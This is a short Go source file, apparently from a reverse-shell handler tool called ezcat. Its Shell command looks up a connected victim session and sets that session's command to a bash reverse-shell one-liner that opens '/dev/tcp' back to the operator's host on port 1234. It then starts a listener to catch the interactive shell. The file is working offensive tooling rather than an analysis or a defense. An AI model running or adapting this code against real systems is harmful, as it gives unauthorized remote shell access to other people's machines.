package cmds

import (
	"fmt"

	"github.com/ngn13/ezcat/bridge"
	"github.com/ngn13/ezcat/shell"
	"github.com/ngn13/ezcat/term"
)

func Shell(args []string){
  if len(args) != 1 {
    term.Error("Specify a shell ID")
    return
  }

  id := args[0]
  indx := bridge.CheckID(id)
  if indx == -1 || !bridge.SHELLS[indx].Connected {
    term.Error("Shell not found")
    return 
  }

  bridge.SHELLS[indx].Cmd = fmt.Sprintf("bash -c 'bash -i >& /dev/tcp/%s/1234 0>&1'", bridge.SHELLS[indx].Lhost)
  err := shell.StartListener()
  if err != nil {
    term.Error(err.Error())
  }
}
